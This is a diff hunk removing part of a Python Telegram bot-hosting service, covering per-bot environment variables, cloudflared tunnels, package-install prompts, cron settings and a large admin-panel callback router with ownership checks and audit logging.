-        ack(call, "Sent")
-    except Exception as e:
-        ack(call, f"Error: {e}")
-    finally:
-        try:
-            out.unlink()
-        except Exception:
-            pass
-    # Restore the bot view so the loading caption isn't left on screen.
-    try:
-        render_bot_view(call, bot_id)
-    except Exception:
-        pass
-
-
-def render_env_menu(call: types.CallbackQuery, bot_id: str) -> None:
-    b = find_bot(bot_id)
-    if not b:
-        ack(call, "Not found"); return
-    if b["owner"] != call.from_user.id and not is_admin(call.from_user.id):
-        ack(call, "Not yours"); return
-    env = b.get("env") or {}
-    rows = "\n".join(f"{bullet(k, v)}" for k, v in env.items()) or f"<i>{sc('no variables yet')}</i>"
-    cap = (
-        f"<b>{G['settings']} {sc('Env Vars')} — {esc(b['name'])}</b>\n"
-        f"{G['div_eq']}\n{rows}\n{G['div']}{FOOTER}"
-    )
-    kb = types.InlineKeyboardMarkup()
-    kb.add(Btn(
-        f"{G['plus']}  {sc('Add Variable')}", callback_data=f"env_add_{bot_id}"))
-    for k in env:
-        kb.add(Btn(
-            f"{G['no']}  {sc('Delete')} {k}", callback_data=f"env_del_{bot_id}_{k}"))
-    kb.add(Btn(
-        f"{G['back']}  {sc('Bot')}", callback_data=f"bot_view_{bot_id}"))
-    show_menu(call.message.chat.id, PHOTOS["bot"], cap, kb, call=call)
-
-
-def start_env_add(call: types.CallbackQuery, bot_id: str) -> None:
-    USER_STATES[call.from_user.id] = {"flow": "await_env_kv", "bot_id": bot_id}
-    bot.send_message(
-        call.message.chat.id,
-        f"{G['plus']} {sc('Send the variable as')} <code>KEY=VALUE</code>.\n"
-        f"/cancel {sc('to abort')}.",
-        parse_mode="HTML",
-    )
-
-
-def start_tunnel_flow(call: types.CallbackQuery, bot_id: str) -> None:
-    b = find_bot(bot_id)
-    if not b:
-        ack(call, "Not found"); return
-    if b["owner"] != call.from_user.id and not is_admin(call.from_user.id):
-        ack(call, "Not yours"); return
-    owner_doc = db_load()["users"].get(str(b["owner"])) or {}
-    if owner_doc.get("plan", "free") == "free" or not user_plan_active(owner_doc):
-        bot.send_message(
-            call.message.chat.id,
-            f"{G['no']} <b>{sc('Public URL is a premium feature')}.</b>\n"
-            f"{sc('Upgrade your plan to unlock cloudflared tunnels')}.{FOOTER}",
-            parse_mode="HTML",
-        )
-        return
-
-    # Toggle: if already running, stop it.
-    cur = TUNNELS.get(bot_id)
-    if cur and cur.get("proc") and cur["proc"].poll() is None:
-        _stop_tunnel(bot_id)
-        bot.send_message(
-            call.message.chat.id,
-            f"{G['ok']} {sc('Public URL closed')}.{FOOTER}",
-            parse_mode="HTML",
-        )
-        try:
-            render_bot_view(call, bot_id)
-        except Exception:
-            pass
-        return
-
-    USER_STATES[call.from_user.id] = {"flow": "await_tunnel_port", "bot_id": bot_id}
-    bot.send_message(
-        call.message.chat.id,
-        f"<b>{G['cloud']} {sc('Open a Public URL')}</b>\n"
-        f"{G['div']}\n"
-        f"{sc('Send the local port your bot is listening on')} "
-        f"({sc('e.g.')} <code>8080</code>).\n"
-        f"{sc('A random')} <code>*.trycloudflare.com</code> {sc('URL will proxy to that port')}.\n\n"
-        f"{sc('If the port is already in use by another tunnel, pick a different one')}.\n"
-        f"/cancel {sc('to abort')}.",
-        parse_mode="HTML",
-    )
-
-
-def _handle_tunnel_port(m: types.Message, st: Dict[str, Any]) -> None:
-    USER_STATES.pop(m.from_user.id, None)
-    txt = (m.text or "").strip()
-    if not txt.isdigit():
-        bot.reply_to(m, f"{G['no']} {sc('Port must be a number')}.")
-        return
-    port = int(txt)
-    if not (1 <= port <= 65535):
-        bot.reply_to(m, f"{G['no']} {sc('Port must be between 1 and 65535')}.")
-        return
-    b = find_bot(st["bot_id"])
-    if not b:
-        bot.reply_to(m, f"{G['no']} {sc('Bot not found')}."); return
-    if b["owner"] != m.from_user.id and not is_admin(m.from_user.id):
-        bot.reply_to(m, f"{G['no']} {sc('Not yours')}."); return
-
-    # Refuse if any other bot already holds this port via a tunnel
-    for other_id, rec in list(TUNNELS.items()):
-        if other_id == b["_id"]:
-            continue
-        if rec.get("port") == port and rec.get("proc") and rec["proc"].poll() is None:
-            bot.reply_to(
-                m,
-                f"{G['no']} <b>{sc('Port')} {port} {sc('is already in use by another tunnel')}.</b>\n"
-                f"{sc('Please pick a different port')}.",
-                parse_mode="HTML",
-            )
-            return
-
-    status = bot.reply_to(
-        m,
-        f"{G['refresh']} {sc('Opening tunnel on port')} <code>{port}</code> ...",
-        parse_mode="HTML",
-    )
-    res = _start_tunnel(b["_id"], port)
-    if not res.get("ok"):
-        try:
-            bot.edit_message_text(
-                f"{G['no']} <b>{sc('Tunnel failed')}.</b>\n"
-                f"<code>{esc(res.get('error', 'unknown error'))}</code>",
-                chat_id=status.chat.id, message_id=status.message_id,
-                parse_mode="HTML",
-            )
-        except Exception:
-            pass
-        return
-    url = res.get("url") or "(provisioning…)"
-    try:
-        bot.edit_message_text(
-            f"{G['ok']} <b>{sc('Public URL is live')}</b>\n"
-            f"{G['div']}\n"
-            f"{bullet('URL',  url)}\n"
-            f"{bullet('Port', port)}\n\n"
-            f"{sc('Tap the bot menu Public URL button again to stop it')}.{FOOTER}",
-            chat_id=status.chat.id, message_id=status.message_id,
-            parse_mode="HTML", disable_web_page_preview=True,
-        )
-    except Exception:
-        pass
-
-
-def start_pip_install_flow(call: types.CallbackQuery, bot_id: str) -> None:
-    b = find_bot(bot_id)
-    if not b:
-        ack(call, "Not found"); return
-    if b["owner"] != call.from_user.id and not is_admin(call.from_user.id):
-        ack(call, "Not yours"); return
-    USER_STATES[call.from_user.id] = {"flow": "await_pip_install", "bot_id": bot_id}
-    bot.send_message(
-        call.message.chat.id,
-        f"<b>{G['download']} {sc('Install Python package')}</b>\n"
-        f"{G['div']}\n"
-        f"{sc('Send one or more package names separated by spaces')}.\n"
-        f"{sc('Examples')}:\n"
-        f"  <code>requests</code>\n"
-        f"  <code>numpy pandas</code>\n"
-        f"  <code>flask==3.0.0</code>\n\n"
-        f"/cancel {sc('to abort')}.",
-        parse_mode="HTML",
-    )
-
-
-def action_env_delete(call: types.CallbackQuery, bot_id: str, key: str) -> None:
-    b = find_bot(bot_id)
-    if not b:
-        ack(call, "Not found"); return
-    if b["owner"] != call.from_user.id and not is_admin(call.from_user.id):
-        ack(call, "Not yours"); return
-    env = b.get("env") or {}
-    env.pop(key, None)
-    b["env"] = env
-    save_bot(b)
-    ack(call, "Deleted")
-    render_env_menu(call, bot_id)
-
-
-def render_cron(call: types.CallbackQuery, bot_id: str) -> None:
-    b = find_bot(bot_id)
-    if not b:
-        ack(call, "Not found"); return
-    cron = b.get("cron") or {}
-    cap = (
-        f"<b>{G['cog']} {sc('Cron')} — {esc(b['name'])}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{bullet('Restart every', cron.get('restart_hours', '—'))}\n"
-        f"{bullet('Backup every',  cron.get('backup_hours', '—'))}\n"
-        f"{G['div']}\n"
-        f"{sc('Send a message like')} <code>restart=6 backup=12</code> {sc('to set hours')}.\n"
-        f"{sc('Send')} <code>off</code> {sc('to disable cron')}.{FOOTER}"
-    )
-    USER_STATES[call.from_user.id] = {"flow": "await_cron", "bot_id": bot_id}
-    show_menu(call.message.chat.id, PHOTOS["bot"], cap,
-              back_kb(f"bot_view_{bot_id}", "Back"), call=call)
-
-
-# ═════════════════════════════════════════════════════════════════
-# 20. ADMIN PANEL  RENDERS
-# ═════════════════════════════════════════════════════════════════
-
-def render_admin(call: types.CallbackQuery) -> None:
-    if not admin_only_call(call, "view_stats"):
-        return
-    role = admin_role(call.from_user.id)
-    cap = (
-        f"<b>{G['shield']} {sc('Admin Panel')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{bullet('Role',  role)}\n"
-        f"{bullet('Users', len(db_load()['users']))}\n"
-        f"{bullet('Bots',  len(db_load()['bots']))}\n"
-        f"{bullet('Run',   sum(1 for x in RUNNING.values() if x['proc'].poll() is None))}\n"
-        f"{G['div']}{FOOTER}"
-    )
-    show_menu(call.message.chat.id, PHOTOS["admin"], cap, admin_kb(), call=call)
-
-
-def render_admin_subroute(call: types.CallbackQuery, data: str) -> None:
-    if data == "adm_stats":
-        return render_adm_stats(call)
-    if data == "adm_users":
-        return render_adm_users(call)
-    if data == "adm_allbots":
-        return render_adm_allbots(call)
-    if data == "adm_payments":
-        return render_adm_payments(call)
-    if data == "adm_broadcast":
-        return render_adm_broadcast(call)
-    if data == "adm_ban":
-        return render_adm_ban(call)
-    if data == "adm_giveplan":
-        return render_adm_giveplan(call)
-    if data == "adm_approve":
-        return render_adm_payments(call)
-    if data == "adm_coupons":
-        return render_adm_coupons(call)
-    if data == "adm_tickets":
-        return render_adm_tickets(call)
-    if data == "adm_admins":
-        return render_adm_admins(call)
-    if data == "adm_audit":
-        return render_adm_audit(call)
-    if data == "adm_github":
-        return render_adm_github(call)
-    if data == "adm_security":
-        return render_adm_security(call)
-    if data == "adm_maint":
-        return render_adm_maintenance(call)
-    if data == "adm_maint_toggle":
-        cur = bool(get_setting("maintenance", False))
-        set_setting("maintenance", not cur)
-        audit(call.from_user.id, "maintenance_toggle", f"now={not cur}")
-        ack(call, f"Maintenance: {'ON' if not cur else 'OFF'}")
-        return render_adm_maintenance(call)
-    if data == "adm_settings":
-        return render_adm_settings(call)
-    if data == "adm_approval_toggle":
-        cur = approval_required()
-        set_approval_required(not cur)
-        audit(call.from_user.id, "approval_toggle", f"now={not cur}")
-        ack(call, f"Approval Mode: {'ON' if not cur else 'OFF'}")
-        return render_admin(call)
-    if data == "adm_pending":
-        return render_adm_pending(call)
-    if data == "adm_photos":
-        return render_adm_photos(call)
-    if data.startswith("adm_photo_"):
-        key = data[len("adm_photo_"):]
-        return render_adm_photo_one(call, key)
-    if data == "adm_force_backup":
-        if not is_owner(call.from_user.id):
-            ack(call, "Owner only"); return
-        ack(call, "Backing up…")
-        def _bg() -> None:
-            try:
-                ok1 = gh_sync_user_data()
-                pushed = 0
-                for b in db_load()["bots"].values():
-                    if (b.get("approval_status") in (None, "approved")) and b.get("enc_files"):
-                        try:
-                            _gh_sync_bot_files(b)
-                            b["gh_synced_at"] = int(time.time())
-                            save_bot(b)
-                            pushed += 1
-                        except Exception:
-                            pass
-                try:
-                    bot.send_message(
-                        call.from_user.id,
-                        f"<b>{G['ok']} {sc('Force backup done')}</b>\n"
-                        f"{bullet('user_data.json', 'OK' if ok1 else 'FAIL')}\n"
-                        f"{bullet('Bots pushed', pushed)}",
-                        parse_mode="HTML",
-                    )
-                except Exception:
-                    pass
-            except Exception as e:
-                try:
-                    bot.send_message(call.from_user.id,
-                                     f"{G['no']} {sc('Backup error')}: <code>{esc(e)}</code>",
-                                     parse_mode="HTML")
-                except Exception:
-                    pass
-        threading.Thread(target=_bg, daemon=True).start()
-        return
-
-    # ── advanced settings ──────────────────────────────────────────
-    if data == "adm_set_sysinfo":
-        return render_adm_sysinfo(call)
-    if data == "adm_set_plans":
-        return render_adm_plans(call)
-    if data == "adm_set_plans_reset":
-        if not is_owner(call.from_user.id):
-            ack(call, "Owner only"); return
-        s = settings_load()
-        for k in list(s.keys()):
-            if k.startswith("plan_max_bots_"):
-                s.pop(k, None)
-        settings_save(s)
-        audit(call.from_user.id, "plans_reset", "")
-        ack(call, "Plans reset")
-        return render_adm_plans(call)
-    if data.startswith("adm_set_plan_show_"):
-        ack(call, "Use ➕ / ➖ to adjust"); return
-    if data.startswith("adm_set_plan_inc_") or data.startswith("adm_set_plan_dec_"):
-        if not is_owner(call.from_user.id):
-            ack(call, "Owner only"); return
-        inc = data.startswith("adm_set_plan_inc_")
-        key = data.split("_")[-1]
-        if key not in PLAN_LIMITS:
-            ack(call, "Unknown plan"); return
-        cur = int(get_setting(f"plan_max_bots_{key}",
-                              PLAN_LIMITS[key]["max_bots"]))
-        cur = max(1, cur + (1 if inc else -1))
-        set_setting(f"plan_max_bots_{key}", cur)
-        audit(call.from_user.id, "plan_edit", f"{key} max_bots={cur}")
-        ack(call, f"{PLAN_LIMITS[key]['name']}: {cur}")
-        return render_adm_plans(call)
-    if data == "adm_set_reload":
-        if not is_admin(call.from_user.id):
-            ack(call, "No permission"); return
-        cache_clear_all()
-        audit(call.from_user.id, "reload_caches", "")
-        ack(call, "Caches dropped — next read = disk")
-        return render_adm_settings(call)
-    if data == "adm_set_brand":
-        if not is_owner(call.from_user.id):
-            ack(call, "Owner only"); return
-        USER_STATES[call.from_user.id] = {"flow": "await_set_brand"}
-        bot.send_message(call.message.chat.id,
-                         f"{G['settings']} {sc('Send the new brand tag')} "
-                         f"(<i>{sc('plain text, will appear in headers')}</i>):",
-                         parse_mode="HTML")
-        return
-    if data == "adm_set_announce":
-        if not is_owner(call.from_user.id):
-            ack(call, "Owner only"); return
-        USER_STATES[call.from_user.id] = {"flow": "await_set_announce"}
-        bot.send_message(call.message.chat.id,
-                         f"{G['broadcast']} {sc('Send the announce channel handle')} "
-                         f"(<code>@channel</code> or <code>-</code> {sc('to clear')}):",
-                         parse_mode="HTML")
-        return
-    if data == "adm_set_owner":
-        if not is_owner(call.from_user.id):
-            ack(call, "Owner only"); return
-        USER_STATES[call.from_user.id] = {"flow": "await_set_owner"}
-        bot.send_message(call.message.chat.id,
-                         f"{G['shield']} {sc('Send the new owner numeric Telegram ID')}.\n"
-                         f"<i>{sc('You will lose owner rights after this')}.</i>",
-                         parse_mode="HTML")
-        return
-    if data == "adm_set_restart_all":
-        if not is_owner(call.from_user.id):
-            ack(call, "Owner only"); return
-        return render_adm_confirm(call, "adm_set_restart_all", "Restart all running bots")
-    if data == "adm_set_restart_all_yes":
-        if not is_owner(call.from_user.id):
-            ack(call, "Owner only"); return
-        ack(call, "Restarting…")
-        def _rb() -> None:
-            ok, fail = _do_restart_all_bots(call.from_user.id)
-            try:
-                bot.send_message(call.from_user.id,
-                                 f"{G['ok']} {sc('Restart-all done')}: "
-                                 f"{ok} ok, {fail} fail.")
-            except Exception:
-                pass
-        threading.Thread(target=_rb, daemon=True).start()
-        return
-    if data == "adm_set_stop_all":
-        if not is_owner(call.from_user.id):
-            ack(call, "Owner only"); return
-        return render_adm_confirm(call, "adm_set_stop_all", "Stop every running bot")
-    if data == "adm_set_stop_all_yes":
-        if not is_owner(call.from_user.id):
-            ack(call, "Owner only"); return
-        ack(call, "Stopping…")
-        def _sb() -> None:
-            n = _do_stop_all_bots(call.from_user.id)
-            try:
-                bot.send_message(call.from_user.id,
-                                 f"{G['ok']} {sc('Stopped')} {n} {sc('bot(s)')}.")
-            except Exception:
-                pass
-        threading.Thread(target=_sb, daemon=True).start()
-        return
-    if data == "adm_set_clean_orphans":
-        if not is_admin(call.from_user.id):
-            ack(call, "No permission"); return
-        ack(call, "Scanning…")
-        def _co() -> None:
-            dirs, files = _do_clean_orphans()
-            audit(call.from_user.id, "clean_orphans",
-                  f"sandboxes={dirs} files={files}")
-            try:
-                bot.send_message(call.from_user.id,
-                                 f"{G['ok']} {sc('Cleaned')}: "
-                                 f"{dirs} {sc('sandbox(es)')}, "
-                                 f"{files} {sc('orphan file(s)')}.")
-            except Exception:
-                pass
-        threading.Thread(target=_co, daemon=True).start()
-        return
-    if data == "adm_set_export":
-        if not is_owner(call.from_user.id):
-            ack(call, "Owner only"); return
-        ack(call, "Packing export…")
-        def _ex() -> None:
-            try:
-                p = _do_export_data(call.from_user.id)
-                with p.open("rb") as fh:
-                    bot.send_document(
-                        call.from_user.id, fh,
-                        caption=f"{G['ok']} {sc('Encrypted DB export')} "
-                                f"({p.stat().st_size // 1024} KB)")
-            except Exception as e:
-                try:
-                    bot.send_message(
-                        call.from_user.id,
-                        f"{G['no']} {sc('Export error')}: <code>{esc(e)}</code>",
-                        parse_mode="HTML")
-                except Exception:
-                    pass
-        threading.Thread(target=_ex, daemon=True).start()
-        return
-
-    # ── NEW: 6 Advanced Sub-Panel Routes ────────────────────────────
-    if data == "adm_analytics":
-        return render_adm_analytics(call)
-    if data == "adm_user_tools":
-        return render_adm_user_tools(call)
-    if data == "adm_bot_manager":
-        return render_adm_bot_manager(call)
-    if data == "adm_sec_center":
-        return render_adm_sec_center(call)
-    if data == "adm_notify_center":
-        return render_adm_notify_center(call)
-    if data == "adm_sys_tools":
-        return render_adm_sys_tools(call)
-    # Analytics sub-routes
-    if data == "adm_revenue_report":
-        return render_adm_revenue_report(call)
-    if data == "adm_growth_stats":
-        return render_adm_growth_stats(call)
-    if data == "adm_top_users":
-        return render_adm_top_users(call)
-    if data == "adm_plan_dist":
-        return render_adm_plan_dist(call)
-    if data == "adm_bot_activity":
-        return render_adm_bot_activity(call)
-    # User Tools sub-routes
-    if data == "adm_user_search":
-        return render_adm_user_search(call)
-    if data == "adm_banned_list":
-        return render_adm_banned_list(call)
-    if data == "adm_wallet_admin":
-        return render_adm_wallet_admin(call)
-    if data == "adm_user_export_csv":
-        return render_adm_user_export_csv(call)
-    if data == "adm_notify_user":
-        return render_adm_notify_user(call)
-    if data == "adm_user_reset":
-        return render_adm_user_reset_prompt(call)
-    # Bot Manager sub-routes
-    if data == "adm_crashed_bots":
-        return render_adm_crashed_bots(call)
-    if data == "adm_mass_restart_stopped":
-        return render_adm_mass_restart_stopped(call)
-    if data == "adm_mass_restart_stopped_yes":
-        return action_adm_mass_restart_stopped(call)
-    if data == "adm_bot_search":
-        return render_adm_bot_search(call)
-    if data == "adm_bot_size_report":
-        return render_adm_bot_size_report(call)
-    if data == "adm_force_scan_all":
-        return action_adm_force_scan_all(call)
-    if data == "adm_kill_all_now":
-        return render_adm_confirm_custom(call, "adm_kill_all_now_yes",
-                                         "Kill ALL running bots immediately", "adm_bot_manager")
-    if data == "adm_kill_all_now_yes":
-        return action_adm_kill_all(call)
-    # Security Center sub-routes
-    if data == "adm_threat_log":
-        return render_adm_threat_log(call)
-    if data == "adm_sec_stats":
-        return render_adm_sec_stats(call)
-    if data == "adm_sec_whitelist":
-        return render_adm_sec_whitelist_prompt(call)
-    if data == "adm_scan_report":
-        return render_adm_scan_report(call)
-    if data == "adm_sec_blacklist":
-        return render_adm_sec_blacklist(call)
-    # Notifications sub-routes
-    if data == "adm_notify_all":
-        return render_adm_notify_all(call)
-    if data == "adm_notify_running":
-        return render_adm_notify_running(call)
-    if data == "adm_notify_plan_select":
-        return render_adm_notify_plan_select(call)
-    if data.startswith("adm_notify_plan_"):
-        plan_key = data[len("adm_notify_plan_"):]
-        return render_adm_notify_plan(call, plan_key)
-    if data == "adm_schedule_msg":
-        return render_adm_schedule_msg(call)
-    if data == "adm_quick_announce":
-        return render_adm_quick_announce(call)
-    # System Tools sub-routes
-    if data == "adm_sys_health":
-        return render_adm_sys_health(call)
-    if data == "adm_disk_usage":
-        return render_adm_disk_usage(call)
-    if data == "adm_db_info":
-        return render_adm_db_info(call)
-    if data == "adm_clear_cache":
-        cache_clear_all()
-        audit(call.from_user.id, "clear_cache", "manual")
-        ack(call, "All caches cleared!")
-        return render_adm_sys_tools(call)
-    if data == "adm_token_check":
-        return render_adm_token_check(call)
-    if data == "adm_export_users_csv":
-        return render_adm_user_export_csv(call)
-    if data == "adm_set_footer_text":
-        if not is_owner(call.from_user.id):
-            ack(call, "Owner only"); return
-        USER_STATES[call.from_user.id] = {"flow": "await_set_footer"}
-        bot.send_message(call.message.chat.id,
-                         f"{G['settings']} <b>{sc('Send new footer text')}</b> "
-                         f"(<i>{sc('or')} <code>-</code> {sc('to reset')}</i>):",
-                         parse_mode="HTML")
-        return
-    if data == "adm_set_welcome_text":
-        if not is_owner(call.from_user.id):
-            ack(call, "Owner only"); return
-        USER_STATES[call.from_user.id] = {"flow": "await_set_welcome"}
-        bot.send_message(call.message.chat.id,
-                         f"{G['broadcast']} <b>{sc('Send new welcome message')}</b>:",
-                         parse_mode="HTML")
-        return
-    if data == "adm_set_rules_text":
-        if not is_owner(call.from_user.id):
-            ack(call, "Owner only"); return
-        USER_STATES[call.from_user.id] = {"flow": "await_set_rules"}
-        bot.send_message(call.message.chat.id,
-                         f"{G['shield']} <b>{sc('Send new hosting rules text')}</b>:",
-                         parse_mode="HTML")
-        return
-
-    # ══════════════════ MEGA ADVANCED PANEL ROUTES ══════════════════
-    # GitHub Browser
-    if data == "adm_gh_browser":        return render_adm_gh_browser(call)
-    if data == "adm_gh_repos":          return render_adm_gh_repos(call)
-    if data == "adm_gh_refresh_repos":  return render_adm_gh_repos(call, force=True)
-    if data.startswith("adm_ghrepo_"):
-        repo = data[len("adm_ghrepo_"):]
-        st2 = USER_STATES.get(call.from_user.id, {})
-        gh_path = st2.get("gh_path", "")
-        return render_adm_gh_files(call, repo, gh_path)
-    if data == "adm_gh_up":
-        st2 = USER_STATES.get(call.from_user.id, {})
-        repo = st2.get("gh_repo", "")
-        path = "/".join(st2.get("gh_path", "").split("/")[:-1])
-        USER_STATES[call.from_user.id] = {**st2, "gh_path": path}
-        return render_adm_gh_files(call, repo, path)
-    if data.startswith("adm_ghfile_"):
-        idx = int(data[len("adm_ghfile_"):])
-        st2 = USER_STATES.get(call.from_user.id, {})
-        files_list = st2.get("gh_files_list", [])
-        if idx < len(files_list):
-            item = files_list[idx]
-            repo = st2.get("gh_repo", "")
-            if item["type"] == "dir":
-                USER_STATES[call.from_user.id] = {**st2, "gh_path": item["path"]}
-                return render_adm_gh_files(call, repo, item["path"])
-            else:
-                return render_adm_gh_file_view(call, repo, item["path"])
-    if data == "adm_gh_run_file":
-        st2 = USER_STATES.get(call.from_user.id, {})
-        return action_adm_gh_run_file(call, st2.get("gh_repo",""), st2.get("gh_view_path",""))
-    if data == "adm_gh_dl_file":
-        st2 = USER_STATES.get(call.from_user.id, {})
-        return action_adm_gh_dl_file(call, st2.get("gh_repo",""), st2.get("gh_view_path",""))
-    if data == "adm_gh_browse_repo":
-        st2 = USER_STATES.get(call.from_user.id, {})
-        repo = st2.get("gh_repo","")
-        return render_adm_gh_files(call, repo, "")
-    if data == "adm_gh_set_default_repo":
-        st2 = USER_STATES.get(call.from_user.id, {})
-        repo = st2.get("gh_repo","")
-        if repo:
-            set_setting("github_repo", repo)
-            gh_set_config({"repo": repo}); gh_load_config()
-            audit(call.from_user.id, "gh_set_default_repo", repo)
-            ack(call, f"Default repo set: {repo}")
-        return render_adm_gh_browser(call)
-    # Payment Config
-    if data == "adm_pay_config":          return render_adm_pay_config(call)
-    if data == "adm_pay_methods":         return render_adm_pay_methods(call)
-    if data.startswith("adm_pay_edit_"):  return render_adm_pay_method_edit(call, data[len("adm_pay_edit_"):])
-    if data == "adm_pay_limits":          return render_adm_pay_limits(call)
-    if data == "adm_pay_currency":        return render_adm_pay_currency(call)
-    if data == "adm_pay_auto_approve":
-        cur = bool(get_setting("auto_approve_payments", False))
-        set_setting("auto_approve_payments", not cur)
-        audit(call.from_user.id, "auto_approve_toggle", f"now={not cur}")
-        ack(call, f"Auto-approve: {'ON' if not cur else 'OFF'}")
-        return render_adm_pay_config(call)
-    if data == "adm_pay_receipt_tmpl":    return render_adm_pay_receipt_tmpl(call)
-    if data == "adm_pay_notif":           return render_adm_pay_notif_settings(call)
-    if data.startswith("adm_pay_method_"): return action_adm_pay_method_number(call, data)
-    # Bot Config
-    if data == "adm_bot_cfg":             return render_adm_bot_cfg(call)
-    if data == "adm_bc_timeouts":         return render_adm_bc_timeouts(call)
-    if data == "adm_bc_limits":           return render_adm_bc_limits(call)
-    if data == "adm_bc_sandbox":          return render_adm_bc_sandbox(call)
-    if data == "adm_bc_policy":           return render_adm_bc_policy(call)
-    if data == "adm_bc_upload":           return render_adm_bc_upload(call)
-    if data == "adm_bc_env":              return render_adm_bc_env(call)
-    if data.startswith("adm_bc_toggle_"):
-        flag_key = data[len("adm_bc_toggle_"):]
-        cur = bool(get_setting(f"bc_{flag_key}", False))
-        set_setting(f"bc_{flag_key}", not cur)
-        audit(call.from_user.id, f"bc_toggle_{flag_key}", f"now={not cur}")
-        ack(call, f"{flag_key}: {'ON' if not cur else 'OFF'}")
-        return render_adm_bot_cfg(call)
-    if data.startswith("adm_bc_set_"):
-        USER_STATES[call.from_user.id] = {"flow": "await_adm_bc_set", "bc_key": data[len("adm_bc_set_"):]}
-        bot.send_message(call.message.chat.id, f"{G['settings']} {sc('Send new value')}:", parse_mode="HTML"); return
-    # Appearance
-    if data == "adm_appearance":          return render_adm_appearance(call)
-    if data == "adm_app_emojis":          return render_adm_app_emojis(call)
-    if data == "adm_app_theme":           return render_adm_app_theme(call)
-    if data.startswith("adm_app_theme_"):
-        theme = data[len("adm_app_theme_"):]
-        set_setting("ui_theme", theme)
-        audit(call.from_user.id, "set_theme", theme)
-        ack(call, f"Theme: {theme}")
-        return render_adm_app_theme(call)
-    if data == "adm_app_banner":          return render_adm_app_banner(call)
-    if data == "adm_rebuild_banners":
-        _PHOTO_FILE_IDS.clear()
-        ack(call, f"{G['ok']} Banner cache cleared — photos will reload fresh")
-        return render_adm_app_banner(call)
-    if data == "adm_bc_set_currency_symbol":
-        USER_STATES[call.from_user.id] = {"flow": "await_adm_bc_set", "bc_key": "currency_symbol"}
-        bot.send_message(call.message.chat.id, f"{G['settings']} Send new currency symbol (e.g. ₹ $ €):", parse_mode="HTML"); return
-    if data.startswith("adm_bc_set_currency_") and len(data.split("_")) >= 6:
-        parts = data[len("adm_bc_set_currency_"):].split("_", 1)
-        if len(parts) == 2:
-            _bc_set("currency_code", parts[0]); _bc_set("currency_symbol", parts[1])
-            ack(call, f"{G['ok']} Currency set: {parts[0]} {parts[1]}")
-        return render_adm_pay_config(call)
-    if data == "adm_app_emoji_reset":
-        if not is_owner(call.from_user.id): ack(call, "Owner only"); return
-        set_setting("custom_emojis", {})
-        audit(call.from_user.id, "emoji_reset", "")
-        ack(call, "Emojis reset to default")
-        return render_adm_app_emojis(call)
-    if data.startswith("adm_app_emoji_set_"):
-        key = data[len("adm_app_emoji_set_"):]
-        USER_STATES[call.from_user.id] = {"flow": "await_adm_emoji_set", "emoji_key": key}
-        bot.send_message(call.message.chat.id, f"Send emoji for <code>{esc(key)}</code>:", parse_mode="HTML"); return
-    # Coupon Plus
-    if data == "adm_coupon_plus":         return render_adm_coupon_plus(call)
-    if data == "adm_coupon_bulk":         return render_adm_coupon_bulk(call)
-    if data == "adm_coupon_analytics":    return render_adm_coupon_analytics(call)
-    if data == "adm_coupon_expiry":       return render_adm_coupon_expiry(call)
-    if data == "adm_coupon_clearexp":
-        d = db_load()
-        now_s = ts_iso()
-        before = len(d["coupons"])
-        d["coupons"] = {k: v for k, v in d["coupons"].items()
-                        if not (v.get("expiry") and v["expiry"] < now_s)}
-        db_save(d)
-        removed = before - len(d["coupons"])
-        audit(call.from_user.id, "coupon_clear_expired", f"removed={removed}")
-        ack(call, f"Removed {removed} expired coupons")
-        return render_adm_coupon_plus(call)
-    # Templates
-    if data == "adm_templates":           return render_adm_templates(call)
-    if data.startswith("adm_tmpl_edit_"):
-        key = data[len("adm_tmpl_edit_"):]
-        USER_STATES[call.from_user.id] = {"flow": "await_adm_tmpl_edit", "tmpl_key": key}
-        cur = get_setting(f"tmpl_{key}", "") or ""
-        bot.send_message(call.message.chat.id,
-                         f"<b>📝 {sc('Edit Template')}: <code>{esc(key)}</code></b>\n"
-                         f"{G['div']}\n<i>{sc('Current')}:</i>\n{esc(cur) or '(default)'}\n\n"
-                         f"{sc('Send new template text. Use')} <code>{{name}}</code>, <code>{{plan}}</code>, "
-                         f"<code>{{amount}}</code>, <code>{{date}}</code> {sc('as placeholders')}.",
-                         parse_mode="HTML"); return
-    if data.startswith("adm_tmpl_reset_"):
-        key = data[len("adm_tmpl_reset_"):]
-        set_setting(f"tmpl_{key}", "")
-        audit(call.from_user.id, f"tmpl_reset_{key}", "")
-        ack(call, f"Template {key} reset to default")
-        return render_adm_templates(call)
-    # Referral System
-    if data == "adm_referral_sys":        return render_adm_referral_sys(call)
-    if data == "adm_ref_toggle":
-        cur = bool(get_setting("referral_enabled", True))
-        set_setting("referral_enabled", not cur)
-        audit(call.from_user.id, "referral_toggle", f"now={not cur}")
-        ack(call, f"Referrals: {'ON' if not cur else 'OFF'}")
-        return render_adm_referral_sys(call)
-    if data == "adm_ref_stats":           return render_adm_ref_stats(call)
-    if data == "adm_ref_rewards":         return render_adm_ref_rewards(call)
-    if data == "adm_ref_leaderboard":     return render_adm_ref_leaderboard(call)
-    if data == "adm_ref_set_reward":
-        USER_STATES[call.from_user.id] = {"flow": "await_adm_ref_reward"}
-        bot.send_message(call.message.chat.id,
-                         f"{G['settings']} {sc('Send wallet reward amount per referral (in ৳)')}."); return
-    if data == "adm_ref_set_min_plan":
-        USER_STATES[call.from_user.id] = {"flow": "await_adm_ref_min_plan"}
-        plans = ", ".join(PLAN_LIMITS.keys())
-        bot.send_message(call.message.chat.id,
-                         f"{G['settings']} {sc('Send min plan to enable referrals')}: <code>{plans}</code>",
-                         parse_mode="HTML"); return
-    # Janitor
-    if data == "adm_janitor":             return render_adm_janitor(call)
-    if data == "adm_jan_run_now":
-        ack(call, "Running janitor…")
-        threading.Thread(target=lambda: action_adm_jan_run(call.from_user.id), daemon=True).start(); return
-    if data == "adm_jan_rules":           return render_adm_jan_rules(call)
-    if data == "adm_jan_schedule":        return render_adm_jan_schedule(call)
-    if data.startswith("adm_jan_toggle_"):
-        k = data[len("adm_jan_toggle_"):]
-        cur = bool(get_setting(f"jan_{k}", False))
-        set_setting(f"jan_{k}", not cur)
-        audit(call.from_user.id, f"jan_toggle_{k}", f"now={not cur}")
-        ack(call, f"Janitor {k}: {'ON' if not cur else 'OFF'}")
-        return render_adm_janitor(call)
-    # Webhooks
-    if data == "adm_webhooks":            return render_adm_webhooks(call)
-    if data == "adm_wh_set":
-        USER_STATES[call.from_user.id] = {"flow": "await_adm_wh_set"}
